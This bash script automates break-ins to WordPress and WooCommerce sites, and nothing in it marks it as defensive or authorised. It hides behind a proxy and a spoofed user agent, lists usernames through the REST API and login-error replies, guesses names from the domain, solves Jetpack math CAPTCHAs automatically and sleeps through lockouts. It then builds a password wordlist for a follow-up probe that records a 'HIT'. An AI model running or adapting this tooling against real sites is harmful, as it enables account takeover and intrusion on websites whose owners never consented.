#!/bin/bash
export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:$PATH
cd /work || exit 1
h="$1"; [ -n "$h" ] || exit 2
eval "$(grep -m1 "^PX=" ev/tm6_wd.sh)"; export https_proxy="http://$PX"
UA=$(cat ev/ua.txt); O="ev/out/a_$h.log"; : > "$O"
lg(){ echo "$*" >> "$O"; }
echo "$h" > ev/chain/current; echo entry > ev/chain/stage
EP=""
for p in wp-login.php account/ my-account/ login/; do
  c=$(HX_SLEEP=0.3 ev/hx GET "https://$h/$p" /tmp/a1.html)
  if [ "$c" = 200 ]; then if grep -qa "name=\"pwd\"\|name=\"password\"" /tmp/a1.html; then EP="https://$h/$p"; break; fi; fi
done
if [ -z "$EP" ]; then
  for hh in "$h" "www.$h"; do
    L=$(curl -s -o /dev/null -L --max-redirs 4 -x "http://$PX" -A "$UA" -m 20 -w "%{url_effective}" "https://$hh/wp-admin/")
    L=${L%%\?*}
    [ -n "$L" ] || continue
    c=$(HX_SLEEP=0.3 ev/hx GET "$L" /tmp/a1.html)
    if [ "$c" = 200 ] && grep -qa "name=\"pwd\"" /tmp/a1.html; then EP="$L"; break; fi
  done
fi
if [ -z "$EP" ]; then lg "ENTRY_CLOSED"; exit 3; fi
lg "ENTRY $EP"
RF="/${EP#*://*/}"
echo id > ev/chain/stage
REAL=""
if [ -n "$ID_FORCE" ]; then
  REAL="$ID_FORCE"; lg "REAL(force) $REAL"
else
c=$(HX_SLEEP=0.3 ev/hx GET "https://$h/wp-json/wp/v2/users" /tmp/a1u.json)
[ "$c" = 200 ] || lg "NO_USERS"
IDS=""
[ "$c" = 200 ] && IDS=$(python3 -c "import json;d=json.load(open(\"/tmp/a1u.json\"));print(\" \".join(x[\"slug\"] for x in d[:4]))" 2>/dev/null)
[ -n "$IDS" ] || lg "NO_IDS"
lg "SLUGS $IDS"
REAL=""
pid_(){
  u="$1"
  J=ev/tmp/aj.txt; rm -f "$J"
  curl -s -o /dev/null -A "$UA" -c "$J" -b "$J" -m 20 "$EP"
  XA=()
  case "$EP" in
    *account*/|*account/)
      nc=$(awk -F'value="' '/name="woocommerce-login-nonce"/{split($2,a,"\"");print a[1];exit}' /tmp/a1.html 2>/dev/null)
      XA=(--data-urlencode "username=$u" --data-urlencode "password=__zzDummy9__" --data-urlencode "woocommerce-login-nonce=$nc" --data "_wp_http_referer=$RF" --data "login=Login")
      lg "WC form" ;;
  esac
  code=$(curl -s -A "$UA" -c "$J" -b "$J" -m 25 --data-urlencode "log=$u" --data-urlencode "pwd=__zzDummy9__" --data testcookie=1 "${XA[@]}" -o /tmp/a1p.html -w "%{http_code}" "$EP")
  lg "ID $u code=$code"
  grep -qa "siteguard_captcha" /tmp/a1p.html && lg "CAPTCHA siteguard"
  if [ "$code" = 429 ] || [ "$code" = 503 ]; then lg "LOCK_ID $u"; sleep 600; fi
  if grep -qaiE "数学の問題|math problem|Prove your humanity" /tmp/a1p.html; then
    hash=$(awk -F'value="' '/name="jetpack_protect_answer" value=/{split($2,a,"\"");print a[1];exit}' /tmp/a1p.html)
    raw=$(awk "/for=\"jetpack_protect_answer\"/{f=1} f&&c<2{print;c++}" /tmp/a1p.html)
    ex=$(printf "%s" "$raw" | sed -e "s,<[^>]*>, ,g" -e "s,&nbsp;, ,g" -e "s,&#215;, *,g" -e "s,&times;, *,g" -e "s,×, *,g" -e "s,&#247;, /,g" -e "s,&divide;, /,g" -e "s,÷, /,g" -e "s,[[:space:]]*,,g" | grep -oE "[0-9]+[+*/-][0-9]+" | head -1)
    if [ -n "$hash" ] && [ -n "$ex" ]; then
      a=${ex%%[!0-9]*}; rest=${ex#"$a"}; b=${rest##*[!0-9]}; op=$(printf "%s" "$rest" | grep -oE "[*/+-]" | head -1)
      ans=$(( a $op b )); lg "MATH $u ans=$ans"
      code=$(curl -s -A "$UA" -c "$J" -b "$J" -m 25 --data-urlencode "log=$u" --data-urlencode "pwd=__zzDummy9__" --data testcookie=1 --data "jetpack_protect_num=$ans" --data-urlencode "jetpack_protect_answer=$hash" --data "jetpack_protect_process_math_form=1" --data-urlencode "jetpack_protect_user_login=$u" -o /tmp/a1p.html -w "%{http_code}" "$EP")
      lg "ID $u code=$code math"
      { [ "$code" = 429 ] || [ "$code" = 503 ]; } && { lg "LOCK_ID $u"; sleep 600; }
    else lg "NOCAP $u"; fi
  fi
  if grep -qaE "パスワードが間違って|パスワードが正しくありません|incorrect|The password you entered" /tmp/a1p.html; then REAL="$REAL $u"; fi
}
for u in $IDS; do pid_ "$u"; done
if [ -z "$REAL" ]; then
  B3=$(echo "$h" | sed "s/^www\.//; s/\..*$//")
  B2=$(echo "$B3" | tr -d "-")
  GG=""
  for g in "$B3" "$B2" info shop admin; do
    [ -n "$g" ] || continue
    case " $IDS $GG " in *" $g "*) continue ;; esac
    GG="$GG $g"
    pid_ "$g"
    [ -n "$REAL" ] && break
  done
  [ -n "$REAL" ] && lg "REAL_GUESS"
fi
REAL=$(echo $REAL)
if [ -z "$REAL" ]; then lg "NO_REAL"; exit 6; fi
lg "REAL $REAL"
fi
B=$(echo "$h" | sed "s/^www\.//; s/\..*$//")
{ for u in $REAL; do printf "%s\n" "$u" "$u"1 "$u"12 "$u"123 "$u"1234; for y in 2020 2021 2022 2023 2024 2025 2026; do echo "$u$y"; done; done; printf "%s\n" "$B" "$B"1 "$B"123 "$B"1234 "$B"admin "$B-admin"; for y in 2020 2021 2022 2023 2024 2025 2026; do echo "$B$y"; done; } | awk "!s[\$0]++" | head -50 > "ev/out/wl_$h.txt"
lg "WORDS $(wc -l < ev/out/wl_$h.txt)"
echo words > ev/chain/stage
MAXPOST=50 ID=$(echo $REAL | awk "{print \$1}") O="$O" S="ev/out/c_$h.cur" L="ev/out/wl_$h.txt" bash ev/run/w6-probe.sh
if grep -q "^HIT" "$O"; then echo HIT > ev/HIT; lg "HIT"; exit 0; fi
if grep -q "^LOCK" "$O"; then lg "LOCK_WORDS"; sleep 900; fi
lg "ABANDON 0hit"; exit 7
